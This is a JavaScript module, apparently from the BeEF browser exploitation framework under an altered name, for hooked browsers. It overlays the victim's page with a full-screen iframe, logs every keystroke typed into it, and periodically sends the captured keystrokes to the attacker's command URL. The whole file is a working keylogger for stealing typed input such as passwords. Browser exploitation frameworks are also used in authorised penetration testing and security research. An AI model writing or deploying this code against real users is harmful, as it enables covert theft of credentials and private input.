//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

    // logged keystrokes array
    var stream = new Array();

    // add the pressed key to the keystroke stream array
    function keyPressHandler(evt) {
        evt = evt || window.event;
        if (evt) {
            var keyCode = evt.charCode || evt.keyCode;
            charLogged = String.fromCharCode(keyCode);
            stream.push(charLogged);
        }
    }

    // creates the overlay 100% width/height iFrame
    overlay = server.dom.createIframe('fullscreen', {'src':"<%= @iFrameSrc %>", 'id':"overlayiframe", 'name':"overlayiframe"}, {}, null);

    if(server.browser.isIE()){
       // listen for keypress events on the iFrame
        function setKeypressHandler(windowOrFrame, keyHandler) {
            var doc = windowOrFrame.document;
            if (doc) {
                if (doc.attachEvent) {
                    doc.attachEvent(
                        'onkeypress',
                        function () {
                            keyHandler(windowOrFrame.event);
                        }
                    );
                }
                else {
                    doc.onkeypress = keyHandler;
                }
            }
        }

        setKeypressHandler(window.frames.overlayiframe, keyPressHandler);

    }else{
        document.getElementById('overlayiframe').contentWindow.addEventListener('keypress', keyPressHandler, true);
    }

    // every N seconds send the keystrokes back to Server
    setInterval(function queue() {
        var keystrokes = "";
        if (stream.length > 0) {
            for (var i = 0; i < stream.length; i++) {
                keystrokes += stream[i] + "";
            }
            server.net.send("<%= @command_url %>", <%= @command_id %>, "keystrokes=" + keystrokes);
                stream = new Array();
            }
        }, <%= @sendBackInterval %>)
});
